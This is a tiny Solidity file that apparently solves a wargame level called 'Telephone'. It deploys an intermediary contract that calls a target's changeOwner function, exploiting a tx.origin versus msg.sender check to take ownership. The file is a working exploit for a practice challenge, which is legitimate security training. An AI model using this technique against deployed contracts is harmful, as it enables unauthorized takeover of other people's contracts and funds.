//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

contract Telephone {
  function changeOwner(address _owner) public {}
}

contract TelephoneCaller {
    Telephone telephone;

    constructor(address _addr) {
        telephone = Telephone(_addr);
    }

    function callTelephone(address _newOwner) public returns (bool) {
        telephone.changeOwner(_newOwner);
        return true;
    }
}